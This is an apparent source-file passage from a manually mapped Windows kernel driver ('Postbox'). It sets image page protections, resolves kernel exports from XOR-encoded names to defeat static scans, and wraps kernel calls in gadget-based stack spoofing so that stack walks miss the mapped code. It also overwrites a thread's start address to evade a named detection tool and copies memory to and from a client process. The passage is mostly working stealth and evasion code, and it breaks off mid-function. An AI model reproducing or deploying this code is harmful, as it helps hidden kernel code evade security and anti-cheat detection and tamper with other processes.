    // The loader resolved ntoskrnl before mapping. Hand it to the memory layer
    // so the driver can resolve PsInitialSystemProcess/PsLoadedModuleList without
    // importing them (and without a __imp_ IAT slot in the mapped image).
    MemSetPreStartNtoskrnl(L.NtoskrnlBase);

    // Resolve KeIpiGenericCall before the PTE walk: the global flush needs it.
    // Keep it in a local, not .data, so the image has no routine pointer there.
    address IpiGenericCall = 0;
    if (!PostboxResolve(&IpiGenericCall))
    {
        print(ERROR("Postbox: resolve failed before image protection"));
        if (PostboxStartFailure < 100)
            PostboxStartFailure = 22;
        return false;
    }

    const address ImageBase = address((uint64_t) (uintptr_t) &__ImageBase);
    if ((uint64_t) ImageBase != L.ImageBase || (L.ImageBase & 0xFFF) != 0)
    {
        print(ERROR("Postbox: image base mismatch (runtime %p, layout %p)"),
              (void*) (uintptr_t) ImageBase, (void*) (uintptr_t) L.ImageBase);
        PostboxStartFailure = 23;
        return false;
    }

    const uint64_t End = (L.RawBase + L.AllocSize) & ~0xFFFull;
    if (L.ImageBase < L.RawBase || L.ImageBase >= End ||
        L.ImageBase + L.ImageSize > End)
    {
        print(ERROR("Postbox: image layout range is invalid"));
        PostboxStartFailure = 24;
        return false;
    }

    uint32_t Pages = 0;
    for (uint64_t Va = L.ImageBase; Va < End; Va += 0x1000)
    {
        uint32_t Flags = PostboxPageRNx;
        const uint64_t PageEnd = Va + 0x1000;
        for (uint32_t i = 0; i < L.SectionCount; ++i)
        {
            const PostboxSectionLayout& S = L.Sections[i];
            const uint64_t SecStart = L.ImageBase + S.Rva;
            const uint64_t SecEnd = SecStart + S.Size;
            if (PageEnd <= (SecStart & ~0xFFFull) ||
                Va >= ((SecEnd + 0xFFF) & ~0xFFFull))
                continue;

            Flags = PostboxMergePageFlags(Flags, S.Flags);
        }

        const bool Write = (Flags == PostboxPageRwNx);
        const bool Execute = (Flags == PostboxPageRx);
        if (!VerifyOnly)
        {
            if (!SetPageProtection(address(Va), Write, Execute))
            {
                print(ERROR("Postbox: protect page %p failed"), (void*) (uintptr_t) Va);
                PostboxStartFailure = 25;
                return false;
            }
        }

        // E3: verify the PTE the loader wrote. F1 is verify-only: it does not
        // rewrite the PTEs or call KeIpiGenericCall; the loader applied the
        // final protections before entry. A mismatch fails closed.
        // Fail closed if a page is still writable+executable, or if the
        // writable/NX bits do not match the section map. This runs in release
        // too, so the F1 batch and the persistent path both prove the split.
        uint64_t* Verify = nullptr;
        if (!GetPteForVa(address(Va), Verify))
        {
            print(ERROR("Postbox: PTE verify walk failed at %p"), (void*) (uintptr_t) Va);
            PostboxStartFailure = 27;
            return false;
        }
        const uint64_t Pte = *Verify;
        const bool PteWrite = (Pte & 2) != 0;
        const bool PteNx = (Pte & (1ull << 63)) != 0;
        if (PteWrite != Write || PteNx == Execute)
        {
            print(ERROR("Postbox: PTE verify mismatch at %p (pte 0x%llX)"),
                  (void*) (uintptr_t) Va, (unsigned long long) Pte);
            PostboxStartFailure = 27;
            return false;
        }
        ++Pages;
    }
    (void) Pages;   // used by print(), which is compiled out in release

    // The per-page invlpg only covers the current CPU. A T2 AC can cache the
    // pre-protection RWX entry on the other CPU; flush every CPU so the stale
    // entry cannot write .text or execute .data after the split.
    if (FlushAllCpus)
    {
        if (!IpiGenericCall)
        {
            print(ERROR("Postbox: KeIpiGenericCall not resolved"));
            PostboxStartFailure = 26;
            return false;
        }
#ifdef T2_PROBE
        T2Probe(L.ImageBase, (uint64_t) (uintptr_t) IpiGenericCall, 1);
#endif
        PostboxTlbRange Range{ L.ImageBase, End };
        ((FnKeIpiGenericCall) IpiGenericCall)(
            &PostboxFlushTlb, (uint64_t) (uintptr_t) &Range);
#ifdef T2_PROBE
        T2Probe(L.ImageBase, (uint64_t) (uintptr_t) IpiGenericCall, 2);
#endif
    }
    else
    {
        // F1: the loader applied final protections before the entry and no
        // other CPU accessed the private image; the per-page invlpg above
        // covers the entry CPU. The persistent path keeps the global flush.
    }

    print(INFO("Postbox: image protections applied (%u pages, %u sections)"),
          Pages, L.SectionCount);
    return true;
}

bool ProtectImageSections(const PostboxConfig* Config)
{
    if (!Config)
    {
        PostboxStartFailure = 20;
        return false;
    }
    return ProtectImageSectionsLayout(&Config->Layout);
}

static void PostboxPoll();

static bool PostboxResolved = false;

static bool PostboxResolve(address* IpiGenericCallOut)
{
    if (PostboxResolved) return true;
    address Ntoskrnl = GetNtoskrnl();
    if (!Ntoskrnl)
    {
        print(ERROR("Postbox: ntoskrnl not found"));
        PostboxStartFailure = 90;
        return false;
    }

    // Compile-time encoded: Crypt.cpp's EncodeName XorSeeds each export name, so the
    // image's .rdata carries neither plaintext nor ROT1-decipherable bytes. This is
    // anti-static-scan, not secrecy: decoded into stack buffers and wiped after the
    // resolve. The resolved pointers remain in .data.
#ifdef POSTBOX_KEEP_THREAD_SPOOF
    constexpr uint32_t ImportCount = 31;
#else
    constexpr uint32_t ImportCount = 28;
#endif
    // Non-const so the table can be wiped in place after the resolve. Keeping
    // it in .data avoids the read-only .rdata TLB problem that blocked the
    // earlier wipe attempt.
    static EncodedName EncodedNames[] = {
        EncodeName("KeInitializeTimerEx"),
        EncodeName("KeInitializeDpc"),
        EncodeName("KeSetCoalescableTimer"),
        EncodeName("KeCancelTimer"),
        EncodeName("KeFlushQueuedDpcs"),
        EncodeName("ExQueueWorkItem"),
        EncodeName("PsLookupProcessByProcessId"),
        EncodeName("ObDereferenceObject"),
        EncodeName("KeDelayExecutionThread"),
        EncodeName("PsGetProcessCreateTimeQuadPart"),
        EncodeName("ExAllocatePoolWithTag"),
        EncodeName("ExFreePool"),
        EncodeName("MmCopyVirtualMemory"),
        EncodeName("KeIpiGenericCall"),
        EncodeName("PsGetCurrentProcess"),
        EncodeName("PsAcquireProcessExitSynchronization"),
        EncodeName("PsReleaseProcessExitSynchronization"),
#ifdef POSTBOX_KEEP_THREAD_SPOOF
        EncodeName("PsCreateSystemThread"),
        EncodeName("NtClose"),
#endif
        EncodeName("KeEnterCriticalRegion"),
        EncodeName("KeLeaveCriticalRegion"),
#ifdef POSTBOX_KEEP_THREAD_SPOOF
        EncodeName("PsLookupThreadByThreadId"),
#endif
        EncodeName("KeQueryInterruptTimePrecise"),
        EncodeName("KeStackAttachProcess"),
        EncodeName("KeUnstackDetachProcess"),
        EncodeName("KeWaitForSingleObject"),
        EncodeName("ObReferenceObjectByHandle"),
        EncodeName("PsCreateSystemThread"),
        EncodeName("ZwClose"),
        EncodeName("ExEventObjectType"),
        EncodeName("PsTerminateSystemThread"),
    };
    static_assert(sizeof(EncodedNames) / sizeof(EncodedNames[0]) == ImportCount,
                  "import name table changed");

    char Decoded[ImportCount][40] = {};
    const char* Names[ImportCount] = {};
    for (uint32_t i = 0; i < ImportCount; ++i)
    {
        uint32_t j = 0;
        for (; j < 39 && EncodedNames[i].Bytes[j]; ++j)
            Decoded[i][j] = (char) ((unsigned char) EncodedNames[i].Bytes[j] ^ SEED);
        Decoded[i][j] = 0;
        Names[i] = Decoded[i];
    }

    address Functions[ImportCount] = {};
    FindFuncExportsBatch(Ntoskrnl, Names, Functions, ImportCount);
#ifdef T2_PROBE
    {
        const char* ProbeName = "KeGetCurrentProcessorNumberEx";
        address ProbeFn = 0;
        FindFuncExportsBatch(Ntoskrnl, &ProbeName, &ProbeFn, 1);
        g_T2GetProcessorNumberEx = (uint64_t) (uintptr_t) ProbeFn;
        if (!g_T2GetProcessorNumberEx)
            print(ERROR("T2_PROBE: KeGetCurrentProcessorNumberEx not resolved"));
    }
#endif

    g_KeInitializeTimerEx_Raw = Functions[0];
    g_KeInitializeDpc_Raw = Functions[1];
    g_KeSetCoalescableTimer_Raw = Functions[2];
    g_KeCancelTimer_Raw = Functions[3];
    g_KeFlushQueuedDpcs_Raw = Functions[4];
    g_ExQueueWorkItem_Raw = Functions[5];
    g_PsLookupProcessByProcessId_Raw = Functions[6];
    g_ObDereferenceObject_Raw = Functions[7];
    g_KeDelayExecutionThread_Raw = Functions[8];
    g_PsGetProcessCreateTimeQuadPart_Raw = Functions[9];
    g_ExAllocatePoolWithTag_Raw = Functions[10];
    g_ExFreePool_Raw = Functions[11];
    g_MmCopyVirtualMemory_Raw = Functions[12];
    if (IpiGenericCallOut) *IpiGenericCallOut = Functions[13];
    g_PsGetCurrentProcess_Raw = Functions[14];
    g_PsAcquireProcessExitSynchronization_Raw = Functions[15];
    g_PsReleaseProcessExitSynchronization_Raw = Functions[16];
#ifdef POSTBOX_KEEP_THREAD_SPOOF
    g_PsCreateSystemThread_Raw = Functions[17];
    g_ZwClose_Raw = Functions[18];
    g_KeEnterCriticalRegion_Raw = Functions[19];
    g_KeLeaveCriticalRegion_Raw = Functions[20];
    g_PsLookupThreadByThreadId_Raw = Functions[21];
    g_KeQueryInterruptTime_Raw = Functions[22];
#else
    g_KeEnterCriticalRegion_Raw = Functions[17];
    g_KeLeaveCriticalRegion_Raw = Functions[18];
    g_KeQueryInterruptTime_Raw = Functions[19];
#endif
    g_KeStackAttachProcess_Raw = Functions[ImportCount - 8];
    g_KeUnstackDetachProcess_Raw = Functions[ImportCount - 7];
    g_KeWaitForSingleObject_Raw = Functions[ImportCount - 6];
    g_ObReferenceObjectByHandle_Raw = Functions[ImportCount - 5];
    g_PsCreateSystemThreadEvent_Raw = Functions[ImportCount - 4];
    g_ZwCloseEvent_Raw = Functions[ImportCount - 3];
    g_ExEventObjectType_Raw = Functions[ImportCount - 2];
    g_PsTerminateSystemThread_Raw = Functions[ImportCount - 1];
#ifdef POSTBOX_EVENT_START
    print(INFO("Postbox: resolved PsTerminate raw %p at %p"),
          (void*) g_PsTerminateSystemThread_Raw, &g_PsTerminateSystemThread_Raw);
#endif

    for (uint32_t i = 0; i < ImportCount; ++i)
    {
        if (!Functions[i])
        {
            print(ERROR("Postbox: export %s not found"), Names[i]);
            PostboxStartFailure = 100 + i;
            for (uint32_t k = 0; k < ImportCount; ++k)
            {
                volatile char* p = Decoded[k];
                for (uint32_t j = 0; j < 40; ++j) p[j] = 0;
            }
            return false;
        }
    }
    for (uint32_t i = 0; i < ImportCount; ++i)
    {
        volatile char* p = Decoded[i];
        for (uint32_t j = 0; j < 40; ++j) p[j] = 0;
    }

    // The table lives in writable .data now, so wipe it in place after the
    // resolve. A scanner no longer gets a 256-try XOR oracle for the resolved
    // export names; a retry after a failed start still finds the table intact
    // because this wipe runs only on success.
    for (uint32_t i = 0; i < ImportCount; ++i)
    {
        volatile char* p = EncodedNames[i].Bytes;
        for (uint32_t j = 0; j < sizeof(EncodedNames[i].Bytes); ++j) p[j] = 0;
    }
    PostboxResolved = true;
    return true;
}

// Both directions use MmCopyVirtualMemory against the cached client EPROCESS:
// read = client user VA -> kernel stage, write = kernel stage -> client user VA.
// The poll attaches once around the poll body, so the API sees the client as
// current and skips its internal attach. Exit synchronization is held for the
// channel lifetime.
#ifdef STACK_SPOOF
extern "C" uint64_t g_PostboxPopRspRet = 0;
extern "C" uint64_t g_PostboxPopRspRetSkip = 0;
// Exact-entry nt `add rsp,0x28; ret` thunk. The event reaper plants it below
// the thread's terminal copy so MmFreeIndependentPages' shadow-space spill
// cannot overwrite the PsTerminateSystemThread return slot.
extern "C" uint64_t g_PostboxTerminalSkip = 0;
extern "C" uint64_t g_PostboxLastGadget = 0;
extern "C" uint64_t g_PostboxLastRealRsp = 0;
extern "C" uint64_t g_PostboxLastFakeTop = 0;
extern "C" uint64_t g_PostboxProbeTargetRet = 0;
extern "C" volatile long g_PostboxShadowActive = 0;
extern "C" volatile long g_PostboxApiShadow = 0;
extern "C" uint64_t g_PostboxShadowJumpGadget = 0;

extern "C" uint64_t g_PostboxMmCopyTarget = 0;
extern "C" int32_t PostboxMmCopySpoof(void* SourceProcess, void* SourceAddress,
                                      void* TargetProcess, void* TargetAddress,
                                      size_t Size, int32_t PreviousMode, size_t* Done);

extern "C" void PostboxStackProbeTarget();

// Generic call-site spoof. The assembly stub takes the target as its first
// argument, builds an nt-gadget fake stack, and tail-jumps to the target.
extern "C" uint64_t PostboxSpoofCall0(uint64_t Target);
extern "C" uint64_t PostboxSpoofCall1(uint64_t Target, uint64_t A1);
extern "C" uint64_t PostboxSpoofCall2(uint64_t Target, uint64_t A1, uint64_t A2);
extern "C" uint64_t PostboxSpoofCall3(uint64_t Target, uint64_t A1, uint64_t A2, uint64_t A3);
extern "C" uint64_t PostboxSpoofCall4(uint64_t Target, uint64_t A1, uint64_t A2, uint64_t A3,
                                      uint64_t A4);
extern "C" uint64_t PostboxSpoofCall5(uint64_t Target, uint64_t A1, uint64_t A2, uint64_t A3,
                                      uint64_t A4, uint64_t A5);
extern "C" uint64_t PostboxSpoofCall6(uint64_t Target, uint64_t A1, uint64_t A2, uint64_t A3,
                                      uint64_t A4, uint64_t A5, uint64_t A6);
extern "C" uint64_t PostboxSpoofCall7(uint64_t Target, uint64_t A1, uint64_t A2, uint64_t A3,
                                      uint64_t A4, uint64_t A5, uint64_t A6, uint64_t A7);

template <typename T>
static uint64_t PostboxSpoofArg(T Arg)
{
    return (uint64_t) (uintptr_t) Arg;
}

template <typename R>
static R PostboxSpoofResult(uint64_t Value)
{
    return (R) Value;
}

// A bool target returns in al; the upper rax bits are undefined. Convert only
// the low byte, otherwise a failed call can look true.
template <>
bool PostboxSpoofResult<bool>(uint64_t Value)
{
    return (Value & 0xFF) != 0;
}

template <typename R, typename... Args>
static R PostboxSpoofInvoke(uint64_t Target, Args... args)
{
    if constexpr (sizeof...(Args) == 0)
        return PostboxSpoofResult<R>(PostboxSpoofCall0(Target));
    else if constexpr (sizeof...(Args) == 1)
        return PostboxSpoofResult<R>(PostboxSpoofCall1(Target, PostboxSpoofArg(args)...));
    else if constexpr (sizeof...(Args) == 2)
        return PostboxSpoofResult<R>(PostboxSpoofCall2(Target, PostboxSpoofArg(args)...));
    else if constexpr (sizeof...(Args) == 3)
        return PostboxSpoofResult<R>(PostboxSpoofCall3(Target, PostboxSpoofArg(args)...));
    else if constexpr (sizeof...(Args) == 4)
        return PostboxSpoofResult<R>(PostboxSpoofCall4(Target, PostboxSpoofArg(args)...));
    else if constexpr (sizeof...(Args) == 5)
        return PostboxSpoofResult<R>(PostboxSpoofCall5(Target, PostboxSpoofArg(args)...));
    else if constexpr (sizeof...(Args) == 6)
        return PostboxSpoofResult<R>(PostboxSpoofCall6(Target, PostboxSpoofArg(args)...));
    else
        return PostboxSpoofResult<R>(PostboxSpoofCall7(Target, PostboxSpoofArg(args)...));
}

static int32_t PostboxMmCopyVirtualMemorySpoof(
    void* SourceProcess, void* SourceAddress, void* TargetProcess, void* TargetAddress,
    size_t Size, int32_t PreviousMode, size_t* Done)
{
    if (g_PostboxMmCopyTarget && g_PostboxPopRspRet)
        return PostboxMmCopySpoof(SourceProcess, SourceAddress, TargetProcess,
                                  TargetAddress, Size, PreviousMode, Done);
    return ((FnMmCopyVirtualMemory) g_MmCopyVirtualMemory)(
        SourceProcess, SourceAddress, TargetProcess, TargetAddress, Size, PreviousMode, Done);
}
#endif

// Spoofed wrappers for the worker/DPC/reaper calls. In a non-STACK_SPOOF build
// these are direct calls; in the test build the target sees an nt gadget as its
// return address, so a stack walk inside the API has no mapped return address.
static int32_t PostboxDelayExecutionThread(int32_t WaitMode, uint8_t Alertable,
                                           _LARGE_INTEGER* Interval)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_KeDelayExecutionThread)
        return PostboxSpoofInvoke<int32_t>((uint64_t) g_KeDelayExecutionThread,
                                           WaitMode, Alertable, Interval);
#endif
    return ((FnKeDelayExecutionThread) g_KeDelayExecutionThread)(WaitMode, Alertable, Interval);
}

// Deliver any pending kernel APCs before the monitor/refresh thread returns.
// A thread exiting with KernelApcPending set bugchecks 0x20.
extern "C" void PostboxDrainThreadApcs(void)
{
    _LARGE_INTEGER zero = {};
    PostboxDelayExecutionThread(0, 1, &zero);
}

#ifdef POSTBOX_KEEP_THREAD_SPOOF
// Test-only APC-stackwalk thread-loop wait. Absent from the stealth image.
extern "C" int32_t PostboxSpoofedThreadWait(int64_t* Interval)
{
    if (!Interval) return -1;
    return PostboxDelayExecutionThread(0, 0, (_LARGE_INTEGER*) Interval);
}
#endif

static uint32_t PostboxSetCoalescableTimer(PostboxTimer* Timer, _LARGE_INTEGER Due,
                                           uint32_t Period, uint32_t Tolerance, PostboxDpc* Dpc)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_KeSetCoalescableTimer)
        return PostboxSpoofInvoke<uint32_t>((uint64_t) g_KeSetCoalescableTimer,
                                            Timer, Due.QuadPart, Period, Tolerance, Dpc);
#endif
    return ((FnKeSetCoalescableTimer) g_KeSetCoalescableTimer)(
        Timer, Due, Period, Tolerance, Dpc);
}

static uint8_t PostboxCancelTimer(PostboxTimer* Timer)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_KeCancelTimer)
        return PostboxSpoofInvoke<uint8_t>((uint64_t) g_KeCancelTimer, Timer);
#endif
    return ((FnKeCancelTimer) g_KeCancelTimer)(Timer);
}

static void PostboxFlushQueuedDpcs()
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_KeFlushQueuedDpcs)
    {
        PostboxSpoofInvoke<void>((uint64_t) g_KeFlushQueuedDpcs);
        return;
    }
#endif
    ((FnKeFlushQueuedDpcs) g_KeFlushQueuedDpcs)();
}

static int32_t PostboxLookupProcess(void* ProcessId, void** Process)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_PsLookupProcessByProcessId)
        return PostboxSpoofInvoke<int32_t>((uint64_t) g_PsLookupProcessByProcessId,
                                           ProcessId, Process);
#endif
    return ((FnPsLookupProcessByProcessId) g_PsLookupProcessByProcessId)(ProcessId, Process);
}

static int64_t PostboxProcessCreateTime(void* Process)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_PsGetProcessCreateTimeQuadPart)
        return PostboxSpoofInvoke<int64_t>((uint64_t) g_PsGetProcessCreateTimeQuadPart,
                                           Process);
#endif
    return ((FnPsGetProcessCreateTimeQuadPart) g_PsGetProcessCreateTimeQuadPart)(Process);
}

static void PostboxDereferenceObject(void* Object)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_ObDereferenceObject)
    {
        PostboxSpoofInvoke<void>((uint64_t) g_ObDereferenceObject, Object);
        return;
    }
#endif
    ((FnObDereferenceObject) g_ObDereferenceObject)(Object);
}

static void PostboxFreePool(void* Base)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_ExFreePool)
    {
        PostboxSpoofInvoke<void>((uint64_t) g_ExFreePool, Base);
        return;
    }
#endif
    ((FnExFreePool) g_ExFreePool)(Base);
}

static int32_t PostboxAcquireProcessExit(void* Process)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_PsAcquireProcessExitSynchronization)
        return PostboxSpoofInvoke<int32_t>(
            (uint64_t) g_PsAcquireProcessExitSynchronization, Process);
#endif
    return ((FnPsAcquireProcessExitSynchronization)
        g_PsAcquireProcessExitSynchronization)(Process);
}

static void PostboxReleaseProcessExit(void* Process)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_PsReleaseProcessExitSynchronization)
    {
        PostboxSpoofInvoke<void>((uint64_t) g_PsReleaseProcessExitSynchronization, Process);
        return;
    }
#endif
    ((FnPsReleaseProcessExitSynchronization) g_PsReleaseProcessExitSynchronization)(Process);
}

static void PostboxAttachProcess(void* Process, PostboxApcState* ApcState)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_KeStackAttachProcess)
    {
        PostboxSpoofInvoke<void>((uint64_t) g_KeStackAttachProcess, Process, ApcState);
        return;
    }
#endif
    ((FnKeStackAttachProcess) g_KeStackAttachProcess)(Process, ApcState);
}

static void PostboxDetachProcess(PostboxApcState* ApcState)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_KeUnstackDetachProcess)
    {
        PostboxSpoofInvoke<void>((uint64_t) g_KeUnstackDetachProcess, ApcState);
        return;
    }
#endif
    ((FnKeUnstackDetachProcess) g_KeUnstackDetachProcess)(ApcState);
}

static int32_t PostboxReferenceEvent(void* UserHandle, void** Event)
{
    const address TypeAddr = PostboxImportFrom(
        PostboxStatePtr, PostboxStatePtr->Imports.ExEventObjectType);
    void* Type = TypeAddr ? *(void**) TypeAddr : nullptr;
    if (!Type || !g_ObReferenceObjectByHandle) return -1;
    return ((FnObReferenceObjectByHandle) g_ObReferenceObjectByHandle)(
        UserHandle, 0x00100002u, Type, 1, Event, nullptr);
}

static int32_t PostboxCreateEventThread(void** ThreadHandle, void* Start, void* Context)
{
    if (!g_PsCreateSystemThreadEvent) return -1;
    return ((FnPsCreateSystemThreadEvent) g_PsCreateSystemThreadEvent)(
        ThreadHandle, 0x1FFFFFu, nullptr, nullptr, nullptr, Start, Context);
}

static int32_t PostboxWaitEvent(void* Event, void* Timeout)
{
    if (!g_KeWaitForSingleObject) return -1;
    return ((FnKeWaitForSingleObject) g_KeWaitForSingleObject)(
        Event, 0, 0, 0, Timeout);
}

static void PostboxCloseEventThread(void* Handle)
{
    if (Handle && g_ZwCloseEvent)
        ((FnZwCloseEvent) g_ZwCloseEvent)(Handle);
}

#ifdef POSTBOX_KEEP_THREAD_SPOOF
// Test-only legacy thread helpers. The stealth image compiles none of this.
[[maybe_unused]] static int32_t PostboxCreateSystemThread(
    void** ThreadHandle, uint32_t DesiredAccess, void* ObjectAttributes,
    void* ProcessHandle, void* ClientId, void* StartRoutine, void* StartContext)
{
    // Seven stack arguments: keep this direct. The reaper entry itself is a
    // tail jump to MmFreeIndependentPages, so the API return is already nt.
    return ((FnPsCreateSystemThread) g_PsCreateSystemThread)(
        ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, ClientId,
        StartRoutine, StartContext);
}

// Preserved start-address spoof. The zero-thread path creates no ETHREAD, but
// the fallback thread design still rewrites the field unKOver's
// ThreadQuerySetWin32StartAddress path reads.
[[maybe_unused]] static void PostboxSpoofThreadStart(void* ThreadId)
{
    if (!ThreadId || !g_PsLookupThreadByThreadId) return;
    void* ThreadObj = nullptr;
    if (((FnPsLookupThreadByThreadId) g_PsLookupThreadByThreadId)(ThreadId, &ThreadObj) < 0 ||
        !ThreadObj)
        return;
    auto* Eth = (uint8_t*) (uintptr_t) ThreadObj;
    *(uint64_t*) (Eth + 0x4D0) = (uint64_t) (uintptr_t) g_PsCreateSystemThread;
#ifdef NMI_PROBE
    if (PostboxStatePtr)
        __atomic_add_fetch(&PostboxStatePtr->NmiSanitize.ThreadStartSpoofed, 1,
                           __ATOMIC_ACQ_REL);
#endif
    PostboxDereferenceObject(ThreadObj);
}

[[maybe_unused]] static int32_t PostboxCloseHandle(void* Handle)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_ZwClose)
        return PostboxSpoofInvoke<int32_t>((uint64_t) g_ZwClose, Handle);
#endif
    return ((FnZwClose) g_ZwClose)(Handle);
}
#endif

[[maybe_unused]] static void PostboxInitializeTimer(PostboxTimer* Timer, int32_t Type)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_KeInitializeTimerEx)
    {
        PostboxSpoofInvoke<void>((uint64_t) g_KeInitializeTimerEx, Timer, Type);
        return;
    }
#endif
    ((FnKeInitializeTimerEx) g_KeInitializeTimerEx)(Timer, Type);
}

[[maybe_unused]] static void PostboxInitializeDpc(PostboxDpc* Dpc, void (*Routine)(void*, void*, void*, void*),
                                 void* Context)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_KeInitializeDpc)
    {
        PostboxSpoofInvoke<void>((uint64_t) g_KeInitializeDpc, Dpc,
                                 (uint64_t) (uintptr_t) Routine, Context);
        return;
    }
#endif
    ((FnKeInitializeDpc) g_KeInitializeDpc)(Dpc, Routine, Context);
}

static uint8_t PostboxSetPageProtection(void* Addr, size_t Size, uint32_t Protect)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_MmSetPageProtection)
        return PostboxSpoofInvoke<uint8_t>((uint64_t) g_MmSetPageProtection,
                                           Addr, Size, Protect);
#endif
    return ((FnMmSetPageProtection) g_MmSetPageProtection)(Addr, Size, Protect);
}

static void PostboxFreeIndependentPages(void* Addr, size_t Size)
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_MmFreeIndependentPages)
    {
        PostboxSpoofInvoke<void>((uint64_t) g_MmFreeIndependentPages, Addr, Size);
        return;
    }
#endif
    ((FnMmFreeIndependentPages) g_MmFreeIndependentPages)(Addr, Size);
}

static void* PostboxGetCurrentProcess()
{
#ifdef STACK_SPOOF
    if (g_PostboxApiShadow && g_PsGetCurrentProcess)
        return (void*) (uintptr_t) PostboxSpoofInvoke<uint64_t>(
            (uint64_t) g_PsGetCurrentProcess);
#endif
    return ((FnPsGetCurrentProcess) g_PsGetCurrentProcess)();
}

static bool PostboxCopy(void* MailboxProcess, address UserVa, void* Buffer,
                        size_t Size, bool Write)
{
    if (!Size) return true;
    if ((uint64_t) UserVa >= PostboxUserLimit ||
        Size > PostboxUserLimit - (uint64_t) UserVa)
        return false;

    size_t Done = 0;
    int32_t Status;
    if (!Write)
    {
        // Source = client user VA, target = kernel stage, both expressed against
        // the cached client EPROCESS. The poll already attached, so
        // MmCopyVirtualMemory skips its internal attach.
#ifdef STACK_SPOOF
        Status = PostboxMmCopyVirtualMemorySpoof(
            MailboxProcess, (void*) (uintptr_t) UserVa,
            PostboxGetCurrentProcess(), Buffer,
            Size, 0 /* KernelMode */, &Done);
#else
        Status = ((FnMmCopyVirtualMemory) g_MmCopyVirtualMemory)(
            MailboxProcess, (void*) (uintptr_t) UserVa,
            PostboxGetCurrentProcess(), Buffer,
            Size, 0 /* KernelMode */, &Done);
#endif
    }
    else
    {
#ifdef STACK_SPOOF
        Status = PostboxMmCopyVirtualMemorySpoof(
            PostboxGetCurrentProcess(), Buffer,
            MailboxProcess, (void*) (uintptr_t) UserVa,
            Size, 0 /* KernelMode */, &Done);
#else
        Status = ((FnMmCopyVirtualMemory) g_MmCopyVirtualMemory)(
            PostboxGetCurrentProcess(), Buffer,
            MailboxProcess, (void*) (uintptr_t) UserVa,
            Size, 0 /* KernelMode */, &Done);
#endif
    }
    return Status >= 0 && Done == Size;
}

// Intra-image copy call through the generic trampoline. The mapped PostboxCopy
// return address is replaced by the nt gadget while PostboxCopy runs, so a
// stack walk inside the copy path does not see the caller's mapped return.
static bool PostboxCopySpoof(void* MailboxProcess, address UserVa, void* Buffer,
                             size_t Size, bool Write)
{
#ifdef STACK_SPOOF
    if (g_PostboxPopRspRetSkip)
        return PostboxSpoofInvoke<bool>((uint64_t) (uintptr_t) &PostboxCopy,
                                        MailboxProcess, UserVa, Buffer, Size, Write);
#endif
    return PostboxCopy(MailboxProcess, UserVa, Buffer, Size, Write);
}

#ifdef STACK_PROBE
static bool PostboxStackProbeRun(void* MailboxProcess, address DataVa,
                                 PostboxStackProbeResult* Out)
{
    if (!Out) return false;
    // A real kernel stack walk reads the return-address slots of the active
    // frames. Per-call frames are not enumerable from the state page, so
    // the explicit return-slot walk below is empty; the raw scan still records
    // any mapped qword in the live frame window.
    const uint64_t NtBaseW = PostboxStatePtr->NmiSanitize.NtBase;
    const uint64_t NtSizeW = PostboxStatePtr->NmiSanitize.NtSize;
    const uint64_t ImageBaseW = PostboxStatePtr->NmiSanitize.ImageBase;
    uint64_t WalkHits = 0;
    uint64_t Frames = 0;
    uint64_t WalkValues[4] = {};
    // frames are per-call stack frames, not enumerable from the state
    // page. The return-slot walk is empty; the raw scan below still runs.
    const uint64_t* ShadowRsp = nullptr;
    const uint64_t Depth = 0;
    for (uint64_t i = 0; i < Depth && i < 64 && ShadowRsp; ++i)
    {
        const uint64_t Slot = ShadowRsp[i] - 8;
        if (Slot < 0xFFFF800000000000ull)
        {
            if (WalkHits < 4) WalkValues[WalkHits] = Slot;
            ++WalkHits;
            ++Frames;
            continue;
        }
        const uint64_t Value = *(const uint64_t*) (uintptr_t) Slot;
        const bool InNt = NtSizeW && Value >= NtBaseW && Value < NtBaseW + NtSizeW;
        if (!InNt)
        {
            if (WalkHits < 4) WalkValues[WalkHits] = Value;
            ++WalkHits;
        }
        ++Frames;
    }
    // Informational raw scan (not the return-slot metric): from this probe's
    // own entry RSP upward, over the executable window only (image RVA
    // 0x1000..0x7000). Counts any .text-range qword, including spilled code
    // pointers in caller locals; a nonzero value here does not by itself mean
    // a stack walk sees a mapped return.
    uint64_t RawHits = 0;
    const uint64_t EntryRsp = (Depth && ShadowRsp) ? ShadowRsp[Depth - 1] : 0;
    const uint64_t TextLo = ImageBaseW + 0x1000;
    const uint64_t TextHi = ImageBaseW + 0x7000;
    if (EntryRsp >= 0xFFFF800000000000ull)
    {
        for (uint64_t Off = 0; Off < 0x600; Off += 8)
        {
            const uint64_t Value = *(const uint64_t*) (uintptr_t) (EntryRsp + Off);
            if (Value >= TextLo && Value < TextHi) ++RawHits;
        }
    }
    uint8_t Buf[8] = {};
    const bool Ok = PostboxCopySpoof(MailboxProcess, DataVa, Buf, sizeof(Buf), false);
    Out->Magic = PostboxStackProbeMagic;
    Out->MappedHits = WalkHits;
    Out->StackScanned = Frames;
    Out->Hit0 = WalkValues[0];
    Out->Hit1 = WalkValues[1];
    Out->Hit2 = WalkValues[2];
    Out->Hit3 = WalkValues[3];
    Out->RawHits = RawHits;
    Out->RawScanned = EntryRsp ? 0x600 : 0;
    Out->Gadget = g_PostboxLastGadget;
    Out->RealRsp = g_PostboxLastRealRsp;
    Out->FakeTop = g_PostboxLastFakeTop;
    Out->RealRet = Out->RealRsp ? *(uint64_t*) (uintptr_t) Out->RealRsp : 0;
    g_PostboxProbeTargetRet = 0;
    if (g_PostboxShadowActive)
